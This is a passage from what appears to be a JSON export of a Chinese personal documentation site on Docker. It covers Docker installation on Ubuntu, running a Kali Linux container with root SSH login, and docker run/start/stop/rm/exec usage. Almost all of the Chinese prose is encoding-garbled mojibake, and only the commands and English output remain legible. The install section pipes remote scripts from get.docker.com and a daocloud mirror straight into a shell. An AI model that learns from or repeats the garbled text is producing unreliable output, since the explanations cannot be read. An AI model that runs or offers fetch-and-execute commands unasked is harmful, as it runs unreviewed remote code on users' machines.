‡ç­¾ã€‚ Docker Machine Docker Machineæ˜¯ä¸€ä¸ªç®€åŒ–Dockerå®‰è£…çš„å‘½ä»¤è¡Œå·¥å…·, é€šè¿‡ä¸€ä¸ªç®€å•çš„å‘½ä»¤è¡Œå³å¯åœ¨ç›¸åº”çš„å¹³å°ä¸Šå®‰è£…Docker, æ¯”å¦‚VirtualBoxã€ Digital Oceanã€Microsoft Azureã€‚ å®‰è£…-æœåŠ¡å™¨ç‰ˆ è‡ªåŠ¨å®‰è£… ä½¿ç”¨å®˜æ–¹å®‰è£…è„šæœ¬è‡ªåŠ¨å®‰è£… curl -fsSL https://get.docker.com | bash -s docker --mirror Aliyun ä½¿ç”¨å›½å†… daocloud ä¸€é”®å®‰è£…å‘½ä»¤ï¼š curl -sSL https://get.daocloud.io/docker | sh æ‰‹åŠ¨å®‰è£… å¸è½½æ—§ç‰ˆæœ¬ Docker çš„æ—§ç‰ˆæœ¬è¢«ç§°ä¸º docker, docker.io æˆ– docker-engine ã€‚å¦‚æœå·²å®‰è£…, è¯·å¸è½½å®ƒä»¬ï¼š sudo apt-get remove docker docker-engine docker.io containerd runc å½“å‰ç§°ä¸º Docker Engine-Community è½¯ä»¶åŒ… docker-ce ã€‚ ä½¿ç”¨ Docker ä»“åº“è¿›è¡Œå®‰è£… åœ¨æ–°ä¸»æœºä¸Šé¦–æ¬¡å®‰è£… Docker Engine-Community ä¹‹å‰, éœ€è¦è®¾ç½® Docker ä»“åº“ã€‚ä¹‹å, æ‚¨å¯ä»¥ä»ä»“åº“å®‰è£…å’Œæ›´æ–° Docker ã€‚ è®¾ç½®ä»“åº“ æ›´æ–° apt åŒ…ç´¢å¼•: $ sudo apt-get update å®‰è£… apt ä¾èµ–åŒ…, ç”¨äºé€šè¿‡HTTPSæ¥è·å–ä»“åº“: $ sudo apt-get install \\ apt-transport-https \\ ca-certificates \\ curl \\ gnupg-agent \\ software-properties-common æ·»åŠ  Docker çš„å®˜æ–¹ GPG å¯†é’¥ï¼š $ curl -fsSL https://mirrors.ustc.edu.cn/docker-ce/linux/ubuntu/gpg | sudo apt-key add - 9DC8 5822 9FC7 DD38 854A E2D8 8D81 803C 0EBF CD88 é€šè¿‡æœç´¢æŒ‡çº¹çš„å8ä¸ªå­—ç¬¦, éªŒè¯æ‚¨ç°åœ¨æ˜¯å¦æ‹¥æœ‰å¸¦æœ‰æŒ‡çº¹çš„å¯†é’¥ã€‚ $ sudo apt-key fingerprint 0EBFCD88 pub rsa4096 2017 -02-22 [ SCEA ] 9DC8 5822 9FC7 DD38 854A E2D8 8D81 803C 0EBF CD88 uid [ unknown ] Docker Release ( CE deb ) <docker@docker.com> sub rsa4096 2017 -02-22 [ S ] ä½¿ç”¨ä»¥ä¸‹æŒ‡ä»¤è®¾ç½®ç¨³å®šç‰ˆä»“åº“ $ sudo add-apt-repository \\ \"deb [arch=amd64] https://mirrors.ustc.edu.cn/docker-ce/linux/ubuntu/ \\ $( lsb_release -cs ) \\ stable\" å®‰è£… Docker Engine-Community æ›´æ–° apt åŒ…ç´¢å¼•: $ sudo apt-get update å®‰è£…æœ€æ–°ç‰ˆæœ¬çš„ Docker Engine-Community å’Œ containerd , æˆ–è€…è½¬åˆ°ä¸‹ä¸€æ­¥å®‰è£…ç‰¹å®šç‰ˆæœ¬ï¼š $ sudo apt-get install docker-ce docker-ce-cli containerd.io è¦å®‰è£…ç‰¹å®šç‰ˆæœ¬çš„ Docker Engine-Community, è¯·åœ¨ä»“åº“ä¸­åˆ—å‡ºå¯ç”¨ç‰ˆæœ¬, ç„¶åé€‰æ‹©ä¸€ç§å®‰è£…ã€‚åˆ—å‡ºæ‚¨çš„ä»“åº“ä¸­å¯ç”¨çš„ç‰ˆæœ¬ï¼š $ apt-cache madison docker-ce docker-ce | 5 :18.09.1~3-0~ubuntu-xenial | https://mirrors.ustc.edu.cn/docker-ce/linux/ubuntu xenial/stable amd64 Packages docker-ce | 5 :18.09.0~3-0~ubuntu-xenial | https://mirrors.ustc.edu.cn/docker-ce/linux/ubuntu xenial/stable amd64 Packages docker-ce | 18 .06.1~ce~3-0~ubuntu | https://mirrors.ustc.edu.cn/docker-ce/linux/ubuntu xenial/stable amd64 Packages docker-ce | 18 .06.0~ce~3-0~ubuntu | https://mirrors.ustc.edu.cn/docker-ce/linux/ubuntu xenial/stable amd64 Packages ... ä½¿ç”¨ç¬¬äºŒåˆ—ä¸­çš„ç‰ˆæœ¬å­—ç¬¦ä¸²å®‰è£…ç‰¹å®šç‰ˆæœ¬, ä¾‹å¦‚ 5:18.09.1~3-0~ubuntu-xenial: $ sudo apt-get install docker-ce=<VERSION_STRING> docker-ce-cli=<VERSION_STRING> containerd.io æµ‹è¯• Docker æ˜¯å¦å®‰è£…æˆåŠŸ, è¾“å…¥ä»¥ä¸‹æŒ‡ä»¤, æ‰“å°å‡ºä»¥ä¸‹ä¿¡æ¯åˆ™å®‰è£…æˆåŠŸ: $ sudo docker run hello-world Unable to find image 'hello-world:latest' locally latest: Pulling from library/hello-world 1b930d010525: Pull complete Digest: sha256:c3b4ada4687bbaa170745b3e4dd8ac3f194ca95b2d0518b417fb47e5879d9b5f Status: Downloaded newer image for hello-world:latest Hello from Docker! This message shows that your installation appears to be working correctly. To generate this message, Docker took the following steps: 1 . The Docker client contacted the Docker daemon. 2 . The Docker daemon pulled the \"hello-world\" image from the Docker Hub. ( amd64 ) 3 . The Docker daemon created a new container from that image which runs the executable that produces the output you are currently reading. 4 . The Docker daemon streamed that output to the Docker client, which sent it to your terminal. To try something more ambitious, you can run an Ubuntu container with: $ docker run -it ubuntu bash Share images, automate workflows, and more with a free Docker ID: https://hub.docker.com/ For more examples and ideas, visit: https://docs.docker.com/get-started/","tags":"å®¹å™¨ä¸é›†ç¾¤","url":"/yq-doc-source-docs-Container-and-cluster-docker-Introduction-to-docker.html","loc":"/yq-doc-source-docs-Container-and-cluster-docker-Introduction-to-docker.html"},{"title":"ä¸€äº›å‘","text":"æŒ‚è½½æœ¬åœ°å·ä¸åŒæ­¥ ä½¿ç”¨ -v æŒ‚è½½çš„å·ä¸åŒæ­¥, æœäº†ä¸€ä¸‹å¤§å¤šéƒ½è¯´æ˜¯æƒé™é—®é¢˜, ä¸è®¤å¯... é‡å¯å®¹å™¨æœªè§£å†³. æœ€åé‡å¯ç”µè„‘è§£å†³äº†.","tags":"å®¹å™¨ä¸é›†ç¾¤","url":"/yq-doc-source-docs-Container-and-cluster-docker-Some-pits.html","loc":"/yq-doc-source-docs-Container-and-cluster-docker-Some-pits.html"},{"title":"windowså®‰è£…Ubuntu","text":"ç¯å¢ƒ ç³»ç»Ÿ: windows11 å®‰è£…æ¦‚è¿° å®‰è£…è™šæ‹Ÿæœº windowsä¸Šä¸€èˆ¬éƒ½æ˜¯ç”¨çš„ Wmware Woprkstation , å®˜ç½‘ä¸‹è½½åœ°å€: Wmware Woprkstationä¸‹è½½é¡µé¢ , æˆªè‡³2022-12-11, æœ€æ–°ç‰ˆä¸º17Pro, å®‰è£…åŒ…ä¸‹è½½åœ°å€: Wmware Woprkstationå®‰è£…åŒ… . jihuo: è®¸å¯è¯å¯†é’¥ . å®‰è£…Ubuntu å®˜ç½‘ ä¸‹è½½é•œåƒå®‰è£…. è®¾ç½® æ¢æº æˆ‘ä½¿ç”¨çš„æ˜¯æ¸…åæº, å¤‡ä»½åŸæ¥å†…å®¹, å°†æ–°åœ°å€å†™å…¥å³å¯ # é»˜è®¤æ³¨é‡Šäº†æºç é•œåƒä»¥æé«˜ apt update é€Ÿåº¦, å¦‚æœ‰éœ€è¦å¯è‡ªè¡Œå–æ¶ˆæ³¨é‡Š deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ jammy main restricted universe multiverse # deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ jammy main restricted universe multiverse deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ jammy-updates main restricted universe multiverse # deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ jammy-updates main restricted universe multiverse deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ jammy-backports main restricted universe multiverse # deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ jammy-backports main restricted universe multiverse deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ jammy-security main restricted universe multiverse # deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ jammy-security main restricted universe multiverse # é¢„å‘å¸ƒè½¯ä»¶æº, ä¸å»ºè®®å¯ç”¨ # deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ jammy-proposed main restricted universe multiverse # deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ jammy-proposed main restricted universe multiverse å¤‡ä»½: mv /etc/apt/sources.list /etc/apt/sources.list.bak å†™å…¥: echo \"ä¸Šé¢æºåœ°å€\" >/etc/apt/sources.list ,æˆ–è€…ç›´æ¥viè¿›å»ä¿®æ”¹(ç¬¬ä¸€æ¬¡å®‰è£…çš„ç³»ç»Ÿæ²¡æœ‰vim) æ³¨è§£ æ³¨æ„æºåœ°å€åé¢çš„ jammy ä»£è¡¨äº†å½“å‰ç‰ˆæœ¬æ˜¯ Ubuntu 22, å¯ä»¥é€šè¿‡ lsb_release -a æŸ¥çœ‹ æŸ¥çœ‹å½“å‰å·²å®‰è£…Ubuntuç‰ˆæœ¬ ä¸æ˜¯å®‰è£…çš„22ç‰ˆæœ¬çš„æ³¨æ„æ¢æˆè‡ªå·±å¯¹åº”ç‰ˆæœ¬çš„ä»£å·. docker runæ—¶å€™é…ç½®æ˜ å°„è·¯å¾„ windowsä¸linuxè·¯å¾„åˆ†éš”ç¬¦ä¸ä¸€æ ·ï¼Œä¸è¿‡è¿˜æ˜¯å¯ä»¥ä½¿ç”¨linuxçš„åˆ†éš”ç¬¦ä¼ å…¥ï¼Œ æ¯”å¦‚æˆ‘æœ¬åœ°çš„è·¯å¾„æ˜¯: D:\\project\\rst-document\\build å¯ä»¥è¿™æ ·ä¼ å…¥: docker run --name mynginx -p80:80 -v \"/D/project/rst-document/build/html:/usr/share/nginx/html\" -d nginx","tags":"å®¹å™¨ä¸é›†ç¾¤","url":"/yq-doc-source-docs-Container-and-cluster-docker-Windows-installation-Ubuntu.html","loc":"/yq-doc-source-docs-Container-and-cluster-docker-Windows-installation-Ubuntu.html"},{"title":"Dockerå®‰è£…Kali","text":"å‘½ä»¤ # æ‹‰å–é•œåƒ docker pull kalilinux/kali-rolling # æŸ¥çœ‹ docker images # è¿è¡Œ # -t è®© docker åˆ†é…ä¸€ä¸ªä¼ªç»ˆç«¯å¹¶ç»‘å®šåˆ°å®¹å™¨çš„æ ‡å‡†è¾“å…¥ä¸Š # -p æ˜ å°„ç«¯å£, # -d ä¿æŒåå°è¿è¡Œï¼Œ # -c æ‰§è¡Œä¸€äº›å‘½ä»¤ # docker run -t -d -p 60000:22 -p 60001:5901 -p 60002:5902 fd54aef8e4ea /bin/sh -c \"while true; do echo hello world; sleep 1; done\" docker run --rm -t -d -p 60000 :5900 -p 60001 :5901 -p 60002 :5902 --name mykali kalilinux/kali-rolling docker run -t -d -p 60000 :5900 -p 60001 :5901 -p 60002 :5902 --name mykali kalilinux/kali-rolling # æŸ¥çœ‹å®¹å™¨ docker ps # è¿›å…¥ docker exec -it mykali /bin/bash ç³»ç»Ÿç¯å¢ƒé…ç½® # ä¿®æ”¹ root ç”¨æˆ·å¯†ç  passwd root å›½å†…ä¿®æ”¹é•œåƒæº # é˜¿é‡Œäº‘é•œåƒæº vi /etc/apt/sources.list #ä¸­ç§‘å¤§ deb http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib deb-src http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib #é˜¿é‡Œäº‘ deb http://mirrors.aliyun.com/kali kali-rolling main non-free contrib deb-src http://mirrors.aliyun.com/kali kali-rolling main non-free contrib #æ¸…åå¤§å­¦ deb http://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-free deb-src https://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-free #æµ™å¤§ deb http://mirrors.zju.edu.cn/kali kali-rolling main contrib non-free deb-src http://mirrors.zju.edu.cn/kali kali-rolling main contrib non-free #ä¸œè½¯å¤§å­¦ deb http://mirrors.neusoft.edu.cn/kali kali-rolling/main non-free contrib deb-src http://mirrors.neusoft.edu.cn/kali kali-rolling/main non-free contrib #å®˜æ–¹æº deb http://http.kali.org/kali kali-rolling main non-free contrib deb-src http://http.kali.org/kali kali-rolling main non-free contrib #163 deb http://mirrors.163.com/debian/ jessie main non-free contrib deb http://mirrors.163.com/debian/ jessie-updates main non-free contrib deb http://mirrors.163.com/debian/ jessie-backports main non-free contrib deb-src http://mirrors.163.com/debian/ jessie main non-free contrib deb-src http://mirrors.163.com/debian/ jessie-updates main non-free contrib deb-src http://mirrors.163.com/debian/ jessie-backports main non-free contrib deb http://mirrors.163.com/debian-security/ jessie/updates main non-free contrib deb-src http://mirrors.163.com/debian-security/ jessie/updates main non-free contrib SSHæœåŠ¡ # æ›´æ–°ç³»ç»Ÿ apt-get update && apt-get upgrade # å®‰è£…æ‰€éœ€è½¯ä»¶ apt-get install vim net-tools openssh-server # ä¿®æ”¹ vim é…ç½®æ–‡ä»¶ï¼Œå…è®¸ root ç”¨æˆ·è¿œç¨‹ç™»å½• vim /etc/ssh/sshd_config #å¯åŠ¨ ssh æœåŠ¡ service ssh start #å…è®¸å¼€æœºè‡ªå¯åŠ¨ systemctl enable ssh é€šè¿‡60000ç«¯å£sshè¿æ¥ å¿…è¦å·¥å…·å®‰è£… apt update apt install lsb-release vim git python3 net-tools kali-linux-everything æ³¨è§£ kali-linux-everything å¤ªå¤§äº†, å‡ ä¸ªGäº†è¿˜æ²¡å®Œ å®˜ç½‘å»ºè®®è¿™æ ·è£…: # apt update && apt -y install <package> apt update && apt -y install kali-linux-headless apt update && apt -y install kali-linux-large","tags":"å®¹å™¨ä¸é›†ç¾¤","url":"/yq-doc-source-docs-Container-and-cluster-docker-docker-installation-Kali.html","loc":"/yq-doc-source-docs-Container-and-cluster-docker-docker-installation-Kali.html"},{"title":"å®¹å™¨ç”Ÿå‘½å‘¨æœŸç®¡ç†","text":"run åˆ›å»ºä¸€ä¸ªæ–°çš„å®¹å™¨å¹¶è¿è¡Œä¸€ä¸ªå‘½ä»¤, å¦‚æœæ²¡æœ‰ä¼šè‡ªåŠ¨pullæ‹‰å– è¯­æ³•: docker run [OPTIONS] IMAGE [COMMAND] [ARG...] æ³¨è§£ [COMMAND] [ARG...] ä¼šè¦†ç›– dockerfile </docs/å®¹å™¨ä¸é›†ç¾¤/docker/dockerfileç¼–å†™> çš„ CMD OPTIONSè¯´æ˜: -a stdin æŒ‡å®šæ ‡å‡†è¾“å…¥è¾“å‡ºå†…å®¹ç±»å‹ï¼Œå¯é€‰ STDIN/STDOUT/STDERR ä¸‰é¡¹ï¼› -d ä¸ä½¿ç”¨æ­¤é€‰é¡¹å°±ç›´æ¥åœ¨å½“å‰å‘½ä»¤è¡Œçª—å£å‰å°æ‰§è¡Œ; -i ä»¥äº¤äº’æ¨¡å¼è¿è¡Œå®¹å™¨ï¼Œé€šå¸¸ä¸ -t åŒæ—¶ä½¿ç”¨ï¼› -P éšæœºç«¯å£æ˜ å°„ï¼Œä¸åŠ å‚æ•°å°±æ˜¯å¯¹äºå®¹å™¨å†…æ‰“å¼€çš„æ‰€æœ‰ç«¯å£, è‡ªåŠ¨å¯»æ‰¾ä¸»æœºç©ºé—²ç«¯å£æ˜ å°„ -p æŒ‡å®šç«¯å£æ˜ å°„ï¼Œæ ¼å¼ä¸º: ä¸»æœº(å®¿ä¸»)ç«¯å£:å®¹å™¨ç«¯å£ -t ä¸ºå®¹å™¨é‡æ–°åˆ†é…ä¸€ä¸ªä¼ªè¾“å…¥ç»ˆç«¯ï¼Œé€šå¸¸ä¸ -i åŒæ—¶ä½¿ç”¨ï¼› --name= <name> ä¸ºå®¹å™¨æŒ‡å®šä¸€ä¸ªåç§°ï¼› --dns <8.8.8.8> æŒ‡å®šå®¹å™¨ä½¿ç”¨çš„DNSæœåŠ¡å™¨ï¼Œé»˜è®¤å’Œå®¿ä¸»ä¸€è‡´ï¼› --dns-search <example.com> æŒ‡å®šå®¹å™¨DNSæœç´¢åŸŸåï¼Œé»˜è®¤å’Œå®¿ä¸»ä¸€è‡´ï¼› -h mars æŒ‡å®šå®¹å™¨çš„hostnameï¼› -e <username=ritchie> è®¾ç½®ç¯å¢ƒå˜é‡ï¼› --env-file= <env_file> ä»æŒ‡å®šæ–‡ä»¶è¯»å…¥ç¯å¢ƒå˜é‡ï¼› --cpuset= <nums> å¦‚ --cpuset=\"0-2\" --cpuset=\"0,1,2\", ç»‘å®šå®¹å™¨åˆ°æŒ‡å®šCPUè¿è¡Œï¼› -m è®¾ç½®å®¹å™¨ä½¿ç”¨å†…å­˜æœ€å¤§å€¼ï¼› --net= bridge æŒ‡å®šå®¹å™¨çš„ç½‘ç»œè¿æ¥ç±»å‹ï¼Œæ”¯æŒ bridge/host/none/container: å››ç§ç±»å‹ï¼› --link= <link> æ·»åŠ é“¾æ¥åˆ°å¦ä¸€ä¸ªå®¹å™¨ï¼› --expose= <ports> å¼€æ”¾ä¸€ä¸ªç«¯å£æˆ–ä¸€ç»„ç«¯å£ï¼› --volume , -v ç»‘å®šä¸€ä¸ªå·, æ ¼å¼ä¸º $å®¿ä¸»æœºç›®å½•:$å®¹å™¨å†…ç›®å½• --rm é€€å‡ºå®¹å™¨æ—¶, è‡ªåŠ¨åˆ é™¤æ­¤å®¹å™¨ --restart alwaysè¡¨ç¤ºæ£€æµ‹åˆ°æŒ‚æ‰åè‡ªå®šé‡å¯ æ³¨è§£ ä¸€èˆ¬ä¸è·Ÿä»»ä½•å‚æ•°: docker run $image_name æ€»æ˜¯ä¼šäº§ç”Ÿä¸€ä¸ªæŒ‚æ‰çš„å®¹å™¨, åªæœ‰å®¹å™¨å†…æœ‰è¿›ç¨‹è¿è¡Œçš„æ—¶å€™, æ‰ä¸ä¼šæŒ‚æ‰ å®¹å™¨å†…çš„è¿›ç¨‹ , å®¹å™¨å†…çš„è¿›ç¨‹å¿…é¡»å¤„äºå‰å°è¿è¡ŒçŠ¶æ€ï¼Œå¦åˆ™å®¹å™¨å°±ä¼šç›´æ¥é€€å‡º ç¤ºä¾‹ ä½¿ç”¨dockeré•œåƒnginx:latestä»¥åå°æ¨¡å¼å¯åŠ¨ä¸€ä¸ªå®¹å™¨,å¹¶å°†å®¹å™¨å‘½åä¸ºmynginx: docker run --name mynginx -d nginx:latest ä½¿ç”¨é•œåƒnginx:latestä»¥åå°æ¨¡å¼å¯åŠ¨ä¸€ä¸ªå®¹å™¨,å¹¶å°†å®¹å™¨çš„80ç«¯å£æ˜ å°„åˆ°ä¸»æœºéšæœºç«¯å£: docker run -P -d nginx:latest ä½¿ç”¨é•œåƒ nginx:latestï¼Œä»¥åå°æ¨¡å¼å¯åŠ¨ä¸€ä¸ªå®¹å™¨,å°†å®¹å™¨çš„ 80 ç«¯å£æ˜ å°„åˆ°ä¸»æœºçš„ 80 ç«¯å£,ä¸»æœºçš„ç›®å½• /data æ˜ å°„åˆ°å®¹å™¨çš„ /data: docker run -p 80:80 -v /data:/data -d nginx:latest ç»‘å®šå®¹å™¨çš„ 8080 ç«¯å£ï¼Œå¹¶å°†å…¶æ˜ å°„åˆ°æœ¬åœ°ä¸»æœº 127.0.0.1 çš„ 80 ç«¯å£ä¸Š: $ docker run -p 127.0.0.1:80:8080/tcp ubuntu bash ä½¿ç”¨é•œåƒnginx:latestä»¥äº¤äº’æ¨¡å¼å¯åŠ¨ä¸€ä¸ªå®¹å™¨,åœ¨å®¹å™¨å†…æ‰§è¡Œ/bin/bashå‘½ä»¤: runoob@runoob:~$ docker run -it nginx:latest /bin/bash root@b8573233d675:/# start/stop/restart docker start :å¯åŠ¨ä¸€ä¸ªæˆ–å¤šä¸ªå·²ç»è¢«åœæ­¢çš„å®¹å™¨ docker stop :åœæ­¢ä¸€ä¸ªè¿è¡Œä¸­çš„å®¹å™¨ docker restart :é‡å¯å®¹å™¨ è¯­æ³• docker start [OPTIONS] CONTAINER [CONTAINER...] docker stop [OPTIONS] CONTAINER [CONTAINER...] docker restart [OPTIONS] CONTAINER [CONTAINER...] ç¤ºä¾‹ å¯åŠ¨åä¸º qinglong çš„å®¹å™¨ yanque@yanquedembp ~ % docker ps CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES yanque@yanquedembp ~ % yanque@yanquedembp ~ % docker ps -a CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES de1871a5ebeb whyour/qinglong:latest \"./docker/docker-entâ€¦\" 2 weeks ago Exited ( 137 ) 44 hours ago qinglong yanque@yanquedembp ~ % yanque@yanquedembp ~ % docker start qinglong qinglong yanque@yanquedembp ~ % docker ps CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES de1871a5ebeb whyour/qinglong:latest \"./docker/docker-entâ€¦\" 2 weeks ago Up 5 seconds 0 .0.0.0:5700->5700/tcp qinglong yanque@yanquedembp ~ % åœæ­¢åä¸º qinglong çš„å®¹å™¨ yanque@yanquedembp ~ % docker ps CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES de1871a5ebeb whyour/qinglong:latest \"./docker/docker-entâ€¦\" 2 weeks ago Up 5 seconds 0 .0.0.0:5700->5700/tcp qinglong yanque@yanquedembp ~ % yanque@yanquedembp ~ % docker stop qinglong qinglong yanque@yanquedembp ~ % docker ps CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES yanque@yanquedembp ~ % é‡å¯åä¸º qinglong çš„å®¹å™¨ yanque@yanquedembp ~ % docker ps CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES yanque@yanquedembp ~ % yanque@yanquedembp ~ % docker restart qinglong qinglong yanque@yanquedembp ~ % yanque@yanquedembp ~ % docker ps CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES de1871a5ebeb whyour/qinglong:latest \"./docker/docker-entâ€¦\" 2 weeks ago Up 3 seconds 0 .0.0.0:5700->5700/tcp qinglong yanque@yanquedembp ~ % kill docker kill :æ€æ‰ä¸€ä¸ªè¿è¡Œä¸­çš„å®¹å™¨ è¯­æ³• docker kill [OPTIONS] CONTAINER [CONTAINER...] OPTIONSè¯´æ˜: -s å‘å®¹å™¨å‘é€ä¸€ä¸ªä¿¡å· ç¤ºä¾‹ æ€æ‰è¿è¡Œä¸­çš„å®¹å™¨ qinglong yanque@yanquedembp ~ % docker ps CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES de1871a5ebeb whyour/qinglong:latest \"./docker/docker-entâ€¦\" 2 weeks ago Up 26 seconds 0 .0.0.0:5700->5700/tcp qinglong yanque@yanquedembp ~ % yanque@yanquedembp ~ % docker kill -s KILL qinglong qinglong yanque@yanquedembp ~ % docker ps CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES yanque@yanquedembp ~ % rm docker rm : åˆ é™¤ä¸€ä¸ªæˆ–å¤šä¸ªå®¹å™¨ã€‚ è¯­æ³• docker rm [OPTIONS] CONTAINER [CONTAINER...] OPTIONSè¯´æ˜: -f é€šè¿‡ SIGKILL ä¿¡å·å¼ºåˆ¶åˆ é™¤ä¸€ä¸ªè¿è¡Œä¸­çš„å®¹å™¨ã€‚ -l ç§»é™¤å®¹å™¨é—´çš„ç½‘ç»œè¿æ¥ï¼Œè€Œéå®¹å™¨æœ¬èº«ã€‚ -v åˆ é™¤ä¸å®¹å™¨å…³è”çš„å·ã€‚ ç¤ºä¾‹ å¼ºåˆ¶åˆ é™¤å®¹å™¨ db01ã€db02: docker rm -f db01 db02 ç§»é™¤å®¹å™¨ nginx01 å¯¹å®¹å™¨ db01 çš„è¿æ¥ï¼Œè¿æ¥å db: docker rm -l db åˆ é™¤å®¹å™¨ nginx01, å¹¶åˆ é™¤å®¹å™¨æŒ‚è½½çš„æ•°æ®å·: docker rm -v nginx01 åˆ é™¤æ‰€æœ‰å·²ç»åœæ­¢çš„å®¹å™¨: docker rm $(docker ps -a -q) pause/unpause docker pause :æš‚åœå®¹å™¨ä¸­æ‰€æœ‰çš„è¿›ç¨‹ã€‚ docker unpause :æ¢å¤å®¹å™¨ä¸­æ‰€æœ‰çš„è¿›ç¨‹ã€‚ è¯­æ³• docker pause CONTAINER [CONTAINER...] docker unpause CONTAINER [CONTAINER...] OPTIONSè¯´æ˜: -s å‘å®¹å™¨å‘é€ä¸€ä¸ªä¿¡å· ç¤ºä¾‹ æš‚åœæ•°æ®åº“å®¹å™¨db01æä¾›æœåŠ¡: docker pause db01 æ¢å¤æ•°æ®åº“å®¹å™¨ db01 æä¾›æœåŠ¡: docker unpause db01 create docker create : åˆ›å»ºä¸€ä¸ªæ–°çš„å®¹å™¨ä½†ä¸å¯åŠ¨å®ƒ, ç”¨æ³•åŒ docker run è¯­æ³• docker create [OPTIONS] IMAGE [COMMAND] [ARG...] ç”¨æ³•åŒ docker run ç¤ºä¾‹ ä½¿ç”¨dockeré•œåƒ yanquer/kali:config_apt_list2 åˆ›å»ºä¸€ä¸ªå®¹å™¨,å¹¶å°†å®¹å™¨å‘½åä¸º mykali yanque@yanquedembp ~ % docker images REPOSITORY TAG IMAGE ID CREATED SIZE yanquer/kali config_apt_list2 24b7cbbe11fb 2 days ago 236MB yanque@yanquedembp ~ % yanque@yanquedembp ~ % docker create -t -p 60000:5900 -p 60001:5901 -p 60002:5902 --name mykali yanquer/kali:config_apt_list2 WARNING: The requested image's platform (linux/arm64) does not match the detected host platform (linux/amd64) and no specific platform was requested fa15654fc7d19605dbc2415e09d279bfc1d898efae6b1ff8f87f27940aa94cd8 yanque@yanquedembp ~ % yanque@yanquedembp ~ % docker ps -a CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES fa15654fc7d1 yanquer/kali:config_apt_list2 \"bash\" About a minute ago Created mykali exec docker exec : åœ¨è¿è¡Œçš„å®¹å™¨ä¸­æ‰§è¡Œå‘½ä»¤ è¯­æ³• docker exec [OPTIONS] CONTAINER COMMAND [ARG...] OPTIONSè¯´æ˜: -d åˆ†ç¦»æ¨¡å¼, åœ¨åå°è¿è¡Œ -i å³ä½¿æ²¡æœ‰é™„åŠ ä¹Ÿä¿æŒSTDIN æ‰“å¼€ -t åˆ†é…ä¸€ä¸ªä¼ªç»ˆç«¯ ç¤ºä¾‹ è°ƒç”¨å®¹å™¨ mykali æ‰§è¡Œ ls /usr : yanque@yanquedembp ~ % docker exec -it mykali ls /usr bin games include lib libexec local sbin share src å®¹å™¨å¼€å¯ä¸€ä¸ªäº¤äº’æ¨¡å¼ç»ˆç«¯: yanque@yanquedembp ~ % docker exec -it mykali /bin/bash â”Œâ”€â”€(rootã‰¿fa15654fc7d1)-[/] â””â”€# æ³¨è§£ æ‰§è¡ŒæŒ‡ä»¤æ—¶çš„å¯¹è±¡, å¯ä»¥æ˜¯å®¹å™¨å, ä¹Ÿå¯ä»¥æ˜¯å®¹å™¨id","tags":"å®¹å™¨ä¸é›†ç¾¤","url":"/yq-doc-source-docs-Container-and-cluster-docker-docker_command-Container-life-cycle-management.html","loc":"/yq-doc-source-docs-Container-and-cluster-docker-docker_command-Container-life-cycle-management.html"},{"title":"å®¹å™¨æ“ä½œ","text":"ps åˆ—å‡ºå®¹å™¨ è¯­æ³• docker ps [OPTIONS] OPTIONSè¯´æ˜ -a :æ˜¾ç¤ºæ‰€æœ‰çš„å®¹å™¨ï¼ŒåŒ…æ‹¬æœªè¿è¡Œçš„ã€‚ -f :æ ¹æ®æ¡ä»¶è¿‡æ»¤æ˜¾ç¤ºçš„å†…å®¹ã€‚ --format :æŒ‡å®šè¿”å›å€¼çš„æ¨¡æ¿æ–‡ä»¶ã€‚ -l :æ˜¾ç¤ºæœ€è¿‘åˆ›å»ºçš„å®¹å™¨ã€‚ -n :åˆ—å‡ºæœ€è¿‘åˆ›å»ºçš„nä¸ªå®¹å™¨ã€‚ --no-trunc :ä¸æˆªæ–­è¾“å‡ºã€‚ -q :é™é»˜æ¨¡å¼ï¼Œåªæ˜¾ç¤ºå®¹å™¨ç¼–å·ã€‚ -s :æ˜¾ç¤ºæ€»çš„æ–‡ä»¶å¤§å°ã€‚ ç¤ºä¾‹ åˆ—å‡ºæ‰€æœ‰åœ¨è¿è¡Œçš„å®¹å™¨ä¿¡æ¯ã€‚ yanque@yanquedembp ~ % docker ps CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES è¾“å‡ºè¯¦æƒ…ä»‹ç»ï¼š CONTAINER ID: å®¹å™¨ IDã€‚ IMAGE: ä½¿ç”¨çš„é•œåƒã€‚ COMMAND: å¯åŠ¨å®¹å™¨æ—¶è¿è¡Œçš„å‘½ä»¤ã€‚ CREATED: å®¹å™¨çš„åˆ›å»ºæ—¶é—´ã€‚ STATUS: å®¹å™¨çŠ¶æ€ã€‚ STATUS çŠ¶æ€æœ‰7ç§ï¼š createdï¼ˆå·²åˆ›å»ºï¼‰ restartingï¼ˆé‡å¯ä¸­ï¼‰ runningï¼ˆè¿è¡Œä¸­ï¼‰ removingï¼ˆè¿ç§»ä¸­ï¼‰ pausedï¼ˆæš‚åœï¼‰ exitedï¼ˆåœæ­¢ï¼‰ deadï¼ˆæ­»äº¡ï¼‰ PORTS: å®¹å™¨çš„ç«¯å£ä¿¡æ¯å’Œä½¿ç”¨çš„è¿æ¥ç±»å‹ï¼ˆtcpudpï¼‰ã€‚ NAMES: è‡ªåŠ¨åˆ†é…çš„å®¹å™¨åç§°ã€‚ 